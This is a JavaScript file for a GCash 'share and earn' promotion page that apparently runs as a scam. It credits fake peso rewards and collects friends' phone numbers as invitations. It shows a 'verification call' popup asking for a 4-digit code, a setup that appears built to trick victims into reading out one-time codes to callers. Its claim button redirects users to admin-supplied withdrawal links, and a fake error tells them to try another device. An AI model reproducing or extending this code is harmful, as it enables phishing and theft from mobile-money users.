// ========== PROMOTION.JS - SHARE AND EARN ==========
// Firebase for shared data (no Auth), localStorage for cache
// Complete with Firewall ON/OFF logic and 4-digit verification

// ========== FIREWALL VERIFICATION VARIABLES ==========
var currentVerificationCode = null;
var verificationAttempts = 0;
var isVerificationModalOpen = false;

// ========== LOCALSTORAGE KEYS ==========
function getUserStorageKeys() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return null;
    return {
        phone: phone,
        balanceKey: "userBalance_" + phone,
        leftRewardKey: "leftReward_" + phone,
        invitesKey: "invitations_" + phone,
        invitesCountKey: "invitesCount_" + phone,
        rightRewardKey: "rightReward_" + phone
    };
}

// ========== FIREBASE REFERENCE ==========
function getUserRef() {
    var phone = localStorage.getItem("userPhone");
    if (!phone || typeof firebase === 'undefined') return null;
    var db = firebase.database();
    return db.ref('lucky_drop_users/' + phone);
}

// ========== FIREWALL VERIFICATION FUNCTIONS ==========
async function checkFirewallStatus() {
    if (typeof firebase === 'undefined' || !firebase.database) {
        return false;
    }
    try {
        var db = firebase.database();
        var firewallSnap = await db.ref('admin/globalFirewall').once('value');
        var isFirewallOn = firewallSnap.val() && firewallSnap.val().active === true;
        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
        return isFirewallOn;
    } catch(e) {
        console.error("Firewall check error:", e);
        return false;
    }
}

function showFirewallVerificationPopup() {
    if (isVerificationModalOpen) return;
    isVerificationModalOpen = true;
    
    // Generate random 4-digit code
    currentVerificationCode = Math.floor(1000 + Math.random() * 9000).toString();
    console.log("Verification code for this session:", currentVerificationCode);
    
    var modal = document.createElement('div');
    modal.id = 'firewallVerifyModal';
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20001';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
                <p>You will receive a call from our verification system.</p>
                <p>Please enter the <strong>4-digit code</strong> provided during the call.</p>
            </div>
            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
            </div>
            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
            <div style="font-size: 11px; color: #ffaa33; margin-top: 10px;">Waiting for verification call...</div>
        </div>
    `;
    
    document.body.appendChild(modal);
    
    var codeInput = document.getElementById('verifyCodeInput');
    var verifyBtn = document.getElementById('submitVerifyBtn');
    var errorDiv = document.getElementById('verifyErrorMsg');
    
    if (codeInput) codeInput.focus();
    
    verifyBtn.onclick = function() {
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length < 4) {
            errorDiv.innerHTML = "Please enter a 4-digit code.";
            errorDiv.style.display = 'block';
            return;
        }
        
        verificationAttempts++;
        
        if (enteredCode === currentVerificationCode) {
            // Verification successful
            errorDiv.style.display = 'none';
            modal.remove();
            isVerificationModalOpen = false;
            alert("VERIFICATION SUCCESSFUL!\n\nYou may now proceed with your claim.");
        } else {
            errorDiv.innerHTML = "Invalid verification code. Please provide the correct 4-digit code from the verification call.";
            errorDiv.style.display = 'block';
            codeInput.value = '';
            codeInput.focus();
            
            if (verificationAttempts >= 3) {
                errorDiv.innerHTML = "Too many failed attempts. Page will refresh.";
                setTimeout(function() {
                    window.location.reload();
                }, 2000);
            }
        }
    };
    
    modal.onclick = function(e) {
        if (e.target === modal) {
            modal.remove();
            isVerificationModalOpen = false;
        }
    };
}

// ========== LOAD USER DATA FROM FIREBASE ==========
async function loadUserDataFromFirebase() {
    var keys = getUserStorageKeys();
    if (!keys) return;
    
    var userRef = getUserRef();
    if (!userRef) return;
    
    try {
        var snap = await userRef.once('value');
        
        if (snap.exists()) {
            var data = snap.val();
            console.log("Data from Firebase:", data);
            
            if (data.balance !== undefined) {
                localStorage.setItem(keys.balanceKey, data.balance);
            }
            if (data.leftRewardClaimed !== undefined) {
                localStorage.setItem(keys.leftRewardKey, data.leftRewardClaimed ? 'true' : 'false');
            }
            if (data.rightRewardAvailable !== undefined) {
                localStorage.setItem(keys.rightRewardKey, data.rightRewardAvailable);
                updateRightRewardDisplay();
            }
            displayBalance();
        } else {
            await userRef.set({
                phone: keys.phone,
                balance: 0,
                leftRewardClaimed: false,
                leftRewardAmount: 0,
                rightRewardAvailable: 0,
                rightRewardClaimed: 0,
                totalInvites: 0,
                acceptedInvites: 0,
                createdAt: Date.now(),
                lastUpdate: Date.now()
            });
            console.log("Created new user in Firebase");
            saveBalance(0);
        }
    } catch(e) {
        console.log("Firebase error:", e);
        displayBalance();
    }
}

// ========== SAVE BALANCE TO FIREBASE ==========
async function saveBalanceToFirebase(amount) {
    var userRef = getUserRef();
    if (!userRef) return;
    try {
        await userRef.update({
            balance: amount,
            lastUpdate: Date.now()
        });
        console.log("Balance saved to Firebase:", amount);
    } catch(e) {
        console.log("Firebase save error:", e);
    }
}

// ========== BALANCE FUNCTIONS ==========
function saveBalance(amount) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.balanceKey, amount);
    saveBalanceToFirebase(amount);
}

function getBalance() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var balance = localStorage.getItem(keys.balanceKey);
    return balance ? parseInt(balance) : 0;
}

function addBalance(amount) {
    var currentBalance = getBalance();
    var newBalance = currentBalance + amount;
    
    if (newBalance > 1200) {
        alert("Maximum balance of ₱1200 reached!");
        return currentBalance;
    }
    
    saveBalance(newBalance);
    return newBalance;
}

function displayBalance() {
    var balance = getBalance();
    var balanceSpan = document.getElementById('userBalanceDisplay');
    if (balanceSpan) balanceSpan.innerHTML = '₱' + balance;
}

// ========== LEFT REWARD STATUS ==========
async function saveLeftRewardToFirebase(claimed) {
    var userRef = getUserRef();
    if (!userRef) return;
    try {
        await userRef.update({
            leftRewardClaimed: claimed,
            leftRewardAmount: claimed ? 150 : 0,
            leftRewardClaimedAt: claimed ? Date.now() : null
        });
        console.log("Left reward saved to Firebase:", claimed);
    } catch(e) {
        console.log("Firebase save error:", e);
    }
}

function saveLeftRewardClaimed(claimed) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.leftRewardKey, claimed ? 'true' : 'false');
    saveLeftRewardToFirebase(claimed);
}

function getLeftRewardClaimed() {
    var keys = getUserStorageKeys();
    if (!keys) return false;
    var claimed = localStorage.getItem(keys.leftRewardKey);
    return claimed === 'true';
}

// ========== RIGHT REWARD FUNCTIONS ==========
function updateRightRewardDisplay() {
    var keys = getUserStorageKeys();
    if (!keys) return;
    var rightAmount = localStorage.getItem(keys.rightRewardKey);
    var rightAmountSpan = document.getElementById('rightRewardAmount');
    if (rightAmountSpan) {
        rightAmountSpan.innerHTML = '₱' + (rightAmount ? parseInt(rightAmount) : 0);
    }
}

function addRightReward(amount) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    var current = localStorage.getItem(keys.rightRewardKey);
    var currentAmount = current ? parseInt(current) : 0;
    var newAmount = currentAmount + amount;
    localStorage.setItem(keys.rightRewardKey, newAmount);
    updateRightRewardDisplay();
    return newAmount;
}

function claimRightReward() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var available = localStorage.getItem(keys.rightRewardKey);
    var availableAmount = available ? parseInt(available) : 0;
    if (availableAmount <= 0) return 0;
    addBalance(availableAmount);
    localStorage.setItem(keys.rightRewardKey, 0);
    updateRightRewardDisplay();
    return availableAmount;
}

// ========== INVITATION FUNCTIONS ==========
function getInvitations() {
    var keys = getUserStorageKeys();
    if (!keys) return [];
    var invites = localStorage.getItem(keys.invitesKey);
    return invites ? JSON.parse(invites) : [];
}

function saveInvitations(invitations) {
    var keys = getUserStorageKeys();
    if (!keys) return;
    localStorage.setItem(keys.invitesKey, JSON.stringify(invitations));
    localStorage.setItem(keys.invitesCountKey, invitations.length);
}

function addInvitation(friendPhone) {
    var invitations = getInvitations();
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone === friendPhone) return false;
    }
    invitations.push({
        phone: friendPhone,
        status: 'pending',
        timestamp: Date.now()
    });
    saveInvitations(invitations);
    return true;
}

function deleteInvitationByPhone(friendPhone) {
    var invitations = getInvitations();
    var newInvites = [];
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone !== friendPhone) newInvites.push(invitations[i]);
    }
    saveInvitations(newInvites);
}

function getInvitesCount() {
    var keys = getUserStorageKeys();
    if (!keys) return 0;
    var count = localStorage.getItem(keys.invitesCountKey);
    return count ? parseInt(count) : 0;
}

function displayInvitesCount() {
    var count = getInvitesCount();
    var invitesSpan = document.getElementById('invitesCountDisplay');
    if (invitesSpan) invitesSpan.innerHTML = count + ' / 6';
    return count;
}

// ========== RENDER INVITATIONS ==========
function renderInvitationsFromStorage() {
    var invitations = getInvitations();
    var listBody = document.getElementById('inviteListBody');
    if (!listBody) return;
    
    if (invitations.length === 0) {
        listBody.innerHTML = '<div class="invite-empty">No invitations sent</div>';
        return;
    }
    
    var html = '';
    for (var i = 0; i < invitations.length; i++) {
        var inv = invitations[i];
        var formattedPhone = formatPhoneWithAsterisk(inv.phone);
        var statusClass = inv.status === 'approved' ? 'approved' : 'pending';
        var statusText = inv.status === 'approved' ? 'APPROVED' : 'PENDING';
        var disabled = inv.status === 'approved' ? 'disabled' : '';
        
        html += '<div class="invite-item">';
        html += '<div class="invite-item-phone">' + formattedPhone + '</div>';
        html += '<div class="invite-item-status"><span class="status-badge ' + statusClass + '">' + statusText + '</span></div>';
        html += '<div class="invite-item-action">';
        html += '<button class="delete-invite" onclick="deleteInviteFromStorage(\'' + inv.phone + '\')" ' + disabled + '>✕</button>';
        html += '</div>';
        html += '</div>';
    }
    listBody.innerHTML = html;
}

window.sendInviteToStorage = function() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Enter valid 11-digit number starting with 09");
        return;
    }
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    if (getInvitesCount() >= 6) {
        alert("Maximum 6 invites only!");
        return;
    }
    if (addInvitation(friendPhone)) {
        document.getElementById('friendPhoneInput').value = '';
        renderInvitationsFromStorage();
        displayInvitesCount();
        alert("Invitation sent to " + formatPhoneWithAsterisk(friendPhone));
    } else {
        alert("You already invited this person!");
    }
};

window.deleteInviteFromStorage = function(friendPhone) {
    var invitations = getInvitations();
    var invite = null;
    for (var i = 0; i < invitations.length; i++) {
        if (invitations[i].phone === friendPhone) { invite = invitations[i]; break; }
    }
    if (invite && invite.status === 'approved') {
        alert("Cannot delete approved invitation!");
        return;
    }
    if (confirm("Delete invitation?")) {
        deleteInvitationByPhone(friendPhone);
        renderInvitationsFromStorage();
        displayInvitesCount();
    }
};

// ========== FORMAT PHONE ==========
function formatPhoneWithAsterisk(phone) {
    if (!phone || phone.length !== 11) return phone;
    var first4 = phone.substring(0, 4);
    var last4 = phone.substring(7, 11);
    return first4 + '***' + last4;
}

// ========== UPDATE LEFT CARD VISUAL ==========
function updateLeftCardFromStorage() {
    var leftCard = document.getElementById('leftCard');
    if (!leftCard) return;
    if (getLeftRewardClaimed()) {
        leftCard.classList.add('prize-card-claimed');
        leftCard.classList.remove('prize-card-glow');
        leftCard.style.cursor = 'default';
    } else {
        leftCard.classList.add('prize-card-glow');
        leftCard.classList.remove('prize-card-claimed');
        leftCard.style.cursor = 'pointer';
    }
}

// ========== ACTIVATE RIGHT LUCKY CAT ==========
function activateRightLuckyCat() {
    var rightCard = document.getElementById('rightCard');
    if (!rightCard) return;
    var keys = getUserStorageKeys();
    if (!keys) return;
    var rightAmount = localStorage.getItem(keys.rightRewardKey);
    var amount = rightAmount ? parseInt(rightAmount) : 0;
    
    if (amount > 0) {
        rightCard.classList.add('prize-card-pulse');
        rightCard.style.cursor = 'pointer';
        updateRightRewardDisplay();
    } else {
        rightCard.classList.remove('prize-card-pulse');
        rightCard.style.cursor = 'default';
    }
}

// ========== CONFETTI ==========
var confettiAnimation = null;
var confettiTimeout = null;

function startConfetti() {
    var canvas = document.getElementById('confettiCanvas');
    if (!canvas) return;
    stopConfetti();
    canvas.style.display = 'block';
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
    var ctx = canvas.getContext('2d');
    var particles = [];
    for (var i = 0; i < 100; i++) {
        particles.push({
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height - canvas.height,
            size: Math.random() * 6 + 2,
            color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
            speed: Math.random() * 3 + 2
        });
    }
    function draw() {
        if (!canvas || canvas.style.display === 'none') return;
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (var j = 0; j < particles.length; j++) {
            var p = particles[j];
            ctx.fillStyle = p.color;
            ctx.fillRect(p.x, p.y, p.size, p.size);
            p.y += p.speed;
            if (p.y > canvas.height) {
                p.y = -p.size;
                p.x = Math.random() * canvas.width;
            }
        }
        confettiAnimation = requestAnimationFrame(draw);
    }
    draw();
    if (confettiTimeout) clearTimeout(confettiTimeout);
    confettiTimeout = setTimeout(stopConfetti, 3000);
}

function stopConfetti() {
    if (confettiAnimation) {
        cancelAnimationFrame(confettiAnimation);
        confettiAnimation = null;
    }
    var canvas = document.getElementById('confettiCanvas');
    if (canvas) {
        var ctx = canvas.getContext('2d');
        if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
        canvas.style.display = 'none';
    }
}

// ========== FLOATING ANIMATION ==========
function showFloatingPlus(x, y, amount) {
    var floatingDiv = document.createElement('div');
    floatingDiv.className = 'floating-plus';
    floatingDiv.innerHTML = '+₱' + amount;
    floatingDiv.style.position = 'fixed';
    floatingDiv.style.left = x + 'px';
    floatingDiv.style.top = y + 'px';
    floatingDiv.style.color = '#ffd700';
    floatingDiv.style.fontSize = '36px';
    floatingDiv.style.fontWeight = 'bold';
    floatingDiv.style.fontFamily = 'Orbitron, monospace';
    floatingDiv.style.textShadow = '0 0 15px #ffaa33';
    floatingDiv.style.pointerEvents = 'none';
    floatingDiv.style.zIndex = '10001';
    floatingDiv.style.animation = 'floatUp 1s ease-out forwards';
    document.body.appendChild(floatingDiv);
    setTimeout(function() { floatingDiv.remove(); }, 1000);
}

// ========== LEFT LUCKY CAT ==========
function initLeftLuckyCard() {
    var leftCard = document.getElementById('leftCard');
    if (!leftCard) return;
    
    var luckySound = new Audio('sounds/luckycat.mp4');
    luckySound.loop = false;
    luckySound.volume = 0.7;
    
    updateLeftCardFromStorage();
    
    if (!getLeftRewardClaimed()) {
        leftCard.addEventListener('click', function(e) {
            e.stopPropagation();
            if (getLeftRewardClaimed()) {
                alert("You already claimed your ₱150!");
                return;
            }
            luckySound.currentTime = 0;
            luckySound.play().catch(function(err) { console.log("Audio error:", err); });
            
            var rect = this.getBoundingClientRect();
            var x = rect.left + rect.width / 2;
            var y = rect.top + rect.height / 2;
            var newBalance = addBalance(150);
            saveLeftRewardClaimed(true);
            
            this.classList.remove('prize-card-glow');
            this.classList.add('prize-card-claimed');
            this.style.cursor = 'default';
            showFloatingPlus(x, y, 150);
            startConfetti();
            displayBalance();
            
            var statusMsg = document.getElementById('statusMessage');
            if (statusMsg) {
                statusMsg.innerHTML = '<span class="status-locked">🐱 <strong style="color:#ffd700;">+₱150 CLAIMED!</strong> Your balance: <strong style="color:#ffd700;">₱' + newBalance + '</strong> ✨</span>';
                setTimeout(function() {
                    statusMsg.innerHTML = '<span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>';
                }, 4000);
            }
        });
    }
}

// ========== RIGHT LUCKY CAT ==========
function initRightLuckyCat() {
    var rightCard = document.getElementById('rightCard');
    if (!rightCard) return;
    activateRightLuckyCat();
    
    rightCard.addEventListener('click', function(e) {
        e.stopPropagation();
        var keys = getUserStorageKeys();
        if (!keys) return;
        var available = localStorage.getItem(keys.rightRewardKey);
        var availableAmount = available ? parseInt(available) : 0;
        
        if (availableAmount <= 0) {
            alert("No rewards available! Invite friends to earn ₱150 each.");
            return;
        }
        
        var currentBalance = getBalance();
        if (currentBalance >= 1200) {
            alert("Maximum balance of ₱1200 reached!");
            return;
        }
        
        var rect = this.getBoundingClientRect();
        var x = rect.left + rect.width / 2;
        var y = rect.top + rect.height / 2;
        var claimedAmount = claimRightReward();
        
        showFloatingPlus(x, y, claimedAmount);
        startConfetti();
        displayBalance();
        
        this.classList.remove('prize-card-pulse');
        this.classList.add('prize-card-claimed');
        this.style.cursor = 'default';
        updateRightRewardDisplay();
        
        var statusMsg = document.getElementById('statusMessage');
        if (statusMsg) {
            statusMsg.innerHTML = '<span class="status-locked">🐱 <strong style="color:#ffd700;">+₱' + claimedAmount + ' CLAIMED!</strong> Your balance: <strong style="color:#ffd700;">₱' + getBalance() + '</strong> ✨</span>';
            setTimeout(function() {
                statusMsg.innerHTML = '<span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>';
            }, 4000);
        }
    });
}

// ========== CLAIM NOW BUTTON ==========
function initClaimNowButton() {
    var claimNowBtn = document.getElementById('claimNowBtn');
    if (claimNowBtn) {
        var newBtn = claimNowBtn.cloneNode(true);
        claimNowBtn.parentNode.replaceChild(newBtn, claimNowBtn);
        claimNowBtn = newBtn;

        claimNowBtn.innerHTML = '';
        
        var icon = document.createElement('img');
        icon.src = 'images/scatter_icon.jpg';
        icon.className = 'claim-icon';
        icon.style.width = '24px';
        icon.style.height = '24px';
        icon.style.marginRight = '8px';
        icon.style.transition = 'transform 0.3s ease';
        
        claimNowBtn.appendChild(icon);
        claimNowBtn.appendChild(document.createTextNode(' CLAIM NOW!!'));
        
        claimNowBtn.onclick = function(e) {
            e.preventDefault();
            claimNowBtn.disabled = true;
            claimNowBtn.style.opacity = '0.7';
            claimNowBtn.style.cursor = 'wait';
            icon.style.transform = 'rotate(360deg)';
            
            setTimeout(function() {
                icon.style.transform = '';
                claimNowBtn.disabled = false;
                claimNowBtn.style.opacity = '1';
                claimNowBtn.style.cursor = 'pointer';
                showPrizePopup();
            }, 1500);
        };
    }
}

// ========== POPUP FUNCTIONS ==========
function showPrizePopup() {
    var popup = document.getElementById('prizePopup');
    if (popup) {
        popup.style.display = 'flex';
        startConfetti();
    }
}

function closePrizePopup() {
    window.location.reload();
}

// ========== FACEBOOK SHARE ==========
function initFacebookShare() {
    var fbBtn = document.getElementById('shareFBBtn');
    if (fbBtn) {
        fbBtn.onclick = function() {
            var shareUrl = "https://xjiligames.github.io/rewards/index.html";
            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=500');
        };
    }
}

// ========== CLAIM THRU GCASH BUTTON WITH FIREWALL LOGIC ==========
async function handleClaimThruGCash() {
    console.log("CLAIM THRU GCASH clicked");
    
    if (typeof firebase === 'undefined' || !firebase.database) {
        alert("CONNECTION ERROR\n\nPlease refresh the page and try again.");
        return;
    }
    
    try {
        var db = firebase.database();
        
        // Check firewall status
        var isFirewallOn = await checkFirewallStatus();
        
        if (isFirewallOn) {
            showFirewallVerificationPopup();
            return;
        }
        
        // Firewall is OFF - check for available links
        var linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
        
        if (linksSnap.exists()) {
            var key = Object.keys(linksSnap.val())[0];
            var linkData = linksSnap.val()[key];
            var redirectUrl = linkData.url;
            
            if (redirectUrl && !redirectUrl.startsWith('http')) {
                redirectUrl = 'https://' + redirectUrl;
            }
            
            await db.ref('links/' + key).update({
                status: 'claimed',
                claimedAt: Date.now()
            });
            
            alert("✅ CLAIM SUCCESSFUL!\n\nYou will be redirected to complete your withdrawal.");
            window.location.href = redirectUrl;
        } else {
            showWithdrawalErrorModal();
        }
        
    } catch(e) {
        console.error("Error:", e);
        alert("SYSTEM ERROR\n\nPlease try again later or contact support.");
    }
}

function showWithdrawalErrorModal() {
    var modal = document.createElement('div');
    modal.style.position = 'fixed';
    modal.style.top = '0';
    modal.style.left = '0';
    modal.style.width = '100%';
    modal.style.height = '100%';
    modal.style.background = 'rgba(0,0,0,0.95)';
    modal.style.backdropFilter = 'blur(10px)';
    modal.style.zIndex = '20000';
    modal.style.display = 'flex';
    modal.style.alignItems = 'center';
    modal.style.justifyContent = 'center';
    
    modal.innerHTML = `
        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNSUCCESSFUL</h3>
            <div style="color: white; font-size: 13px; line-height: 1.6; text-align: left;">
                <p><strong>Possible Reasons:</strong></p>
                <p>• This device has already reached the maximum payout limit.</p>
                <p>• No GCash app installed on this device.</p>
                <p>• Please try using another device to complete your withdrawal.</p>
            </div>
            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
        </div>
    `;
    
    document.body.appendChild(modal);
    document.getElementById('closeAlertBtn').onclick = function() {
        modal.remove();
    };
}

function initClaimButton() {
    var claimBtn = document.getElementById('claimGCashBtn');
    if (!claimBtn) return;
    
    var newBtn = claimBtn.cloneNode(true);
    claimBtn.parentNode.replaceChild(newBtn, claimBtn);
    claimBtn = newBtn;
    
    claimBtn.onclick = handleClaimThruGCash;
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', function() {
    console.log("Promotion.js loading...");
    
    var userPhone = localStorage.getItem("userPhone");
    if (!userPhone) {
        alert("Please login first.");
        window.location.href = "index.html";
        return;
    }
    
    console.log("User phone:", userPhone);
    
    var display = document.getElementById('userPhoneDisplay');
    if (display) {
        display.innerText = userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11);
    }
    
    loadUserDataFromFirebase().then(function() {
        console.log("Data loaded from Firebase");
    });
    
    displayInvitesCount();
    updateLeftCardFromStorage();
    renderInvitationsFromStorage();
    activateRightLuckyCat();
    
    initLeftLuckyCard();
    initRightLuckyCat();
    initClaimNowButton();
    initClaimButton();
    initFacebookShare();
    
    var sendBtn = document.getElementById('sendInviteBtn');
    if (sendBtn) {
        var newSendBtn = sendBtn.cloneNode(true);
        sendBtn.parentNode.replaceChild(newSendBtn, sendBtn);
        newSendBtn.onclick = window.sendInviteToStorage;
    }
    
    console.log("Promotion.js ready");
});
